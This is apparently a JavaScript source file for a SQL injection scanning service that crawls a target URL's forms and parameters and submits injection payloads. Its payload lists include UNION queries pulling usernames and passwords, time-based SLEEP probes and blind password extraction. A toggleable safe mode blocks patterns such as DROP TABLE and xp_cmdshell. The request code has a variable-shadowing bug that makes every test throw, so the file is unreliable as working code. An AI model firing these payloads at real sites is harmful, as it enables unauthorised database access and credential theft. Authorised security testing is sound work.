// src/core/services/sqlInjectionService.js
const axios = require('axios');
const cheerio = require('cheerio');
const { v4: uuidv4 } = require('uuid');
const logger = require('../../utils/logger');
const config = require('../../config');

class SqlInjectionService {
  constructor() {
    this.safeMode = true;
    this.activeScans = new Map();
    this.payloads = {
      basic: ["' OR '1'='1", "' OR 1=1 --", "admin'--"],
      union: ["' UNION SELECT null,username,password FROM users--", "' UNION SELECT 1,@@version,3--"],
      error: ["' AND 1=CONVERT(int,@@version)--", "' AND 1=1/0--"],
      time: ["' OR IF(1=1,SLEEP(5),0)--", "' OR (SELECT * FROM (SELECT(SLEEP(5)))--"],
      blind: ["' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"]
    };
  }

  async scan(url, options = {}) {
    const scanId = uuidv4();
    const scanData = {
      id: scanId,
      status: 'running',
      target: url,
      results: [],
      startTime: new Date(),
      stats: {
        totalTests: 0,
        vulnerabilitiesFound: 0,
        injectionPoints: 0
      }
    };

    this.activeScans.set(scanId, scanData);

    try {
      // 1. Initial page analysis
      const { data, config: reqConfig } = await this._fetchPage(url);
      const $ = cheerio.load(data);
      
      // 2. Find injection points
      const injectionPoints = this._findInjectionPoints($, url, reqConfig.method);
      scanData.stats.injectionPoints = injectionPoints.length;
      
      // 3. Test each injection point
      for (const point of injectionPoints) {
        const results = await this._testInjectionPoint(point, options);
        scanData.results.push({
          point,
          results
        });
        scanData.stats.totalTests += results.length;
        scanData.stats.vulnerabilitiesFound += results.filter(r => r.isVulnerable).length;
      }

      scanData.status = 'completed';
      return scanData;

    } catch (error) {
      scanData.status = 'failed';
      scanData.error = error.message;
      throw error;
    } finally {
      scanData.endTime = new Date();
      this.activeScans.set(scanId, scanData);
    }
  }

  async _fetchPage(url) {
    try {
      const response = await axios.get(url, {
        timeout: config.sqlInjection.timeout,
        validateStatus: () => true
      });
      return {
        data: response.data,
        config: {
          method: 'GET',
          url: response.config.url
        }
      };
    } catch (error) {
      logger.error(`Failed to fetch page: ${error.message}`);
      throw new Error(`Failed to fetch target page: ${error.message}`);
    }
  }

  _findInjectionPoints($, baseUrl, method) {
    const points = [];
    
    // Find forms
    $('form').each((i, form) => {
      const action = $(form).attr('action') || '';
      const method = $(form).attr('method')?.toUpperCase() || 'POST';
      const inputs = [];
      
      $(form).find('input, textarea, select').each((j, input) => {
        inputs.push({
          name: $(input).attr('name'),
          type: $(input).attr('type') || 'text',
          value: $(input).attr('value') || ''
        });
      });

      if (inputs.length > 0) {
        points.push({
          type: 'form',
          url: new URL(action, baseUrl).href,
          method,
          inputs
        });
      }
    });

    // Find URL parameters (for GET requests)
    if (method === 'GET') {
      const url = new URL(baseUrl);
      url.searchParams.forEach((value, name) => {
        points.push({
          type: 'url_parameter',
          url: baseUrl,
          method: 'GET',
          inputs: [{
            name,
            type: 'parameter',
            value
          }]
        });
      });
    }

    return points;
  }

  async _testInjectionPoint(point, options) {
    const results = [];
    const payloads = this._getPayloadsForScan(options.scanType || 'basic');
    
    for (const payload of payloads) {
      if (this.safeMode && this._isDestructivePayload(payload)) {
        results.push({
          payload,
          status: 'blocked',
          isVulnerable: false,
          error: 'Payload blocked in safe mode'
        });
        continue;
      }

      try {
        const config = {
          method: point.method.toLowerCase(),
          url: point.url,
          timeout: config.sqlInjection.timeout
        };

        // Prepare request data
        if (point.method === 'GET') {
          config.params = point.inputs.reduce((acc, input) => {
            acc[input.name] = input.type === 'hidden' ? input.value : payload;
            return acc;
          }, {});
        } else {
          config.data = point.inputs.reduce((acc, input) => {
            acc[input.name] = input.type === 'hidden' ? input.value : payload;
            return acc;
          }, {});
        }

        const response = await axios(config);
        results.push({
          payload,
          status: response.status,
          isVulnerable: this._detectVulnerability(response.data),
          response: {
            length: response.data.length,
            status: response.status
          }
        });

      } catch (error) {
        results.push({
          payload,
          status: error.response?.status || 0,
          isVulnerable: false,
          error: error.message
        });
      }
    }

    return results;
  }

  _getPayloadsForScan(scanType) {
    if (scanType === 'full') {
      return Object.values(this.payloads).flat();
    }
    return this.payloads[scanType] || this.payloads.basic;
  }

  _isDestructivePayload(payload) {
    const destructivePatterns = [
      /DROP\s+TABLE/i,
      /DELETE\s+FROM/i,
      /TRUNCATE\s+TABLE/i,
      /xp_cmdshell/i
    ];
    return destructivePatterns.some(pattern => pattern.test(payload));
  }

  _detectVulnerability(responseBody) {
    if (typeof responseBody !== 'string') return false;
    
    const indicators = [
      'error in your SQL syntax',
      'unexpected end of SQL command',
      'mysql_fetch_array()',
      'syntax error',
      'SQL Server Native Client',
      'ODBC Driver',
      'PostgreSQL query failed',
      'ORA-[0-9]{5}',
      'Warning: mysql'
    ];
    
    return indicators.some(indicator => 
      new RegExp(indicator, 'i').test(responseBody)
    );
  }

  toggleSafeMode() {
    this.safeMode = !this.safeMode;
    logger.info(`SQL Injection Safe Mode ${this.safeMode ? 'activated' : 'deactivated'}`);
    return this.safeMode;
  }

  getScanStatus(scanId) {
    return this.activeScans.get(scanId);
  }

  cancelScan(scanId) {
    const scan = this.activeScans.get(scanId);
    if (scan && scan.status === 'running') {
      scan.status = 'cancelled';
      this.activeScans.set(scanId, scan);
      return true;
    }
    return false;
  }
}

module.exports = new SqlInjectionService();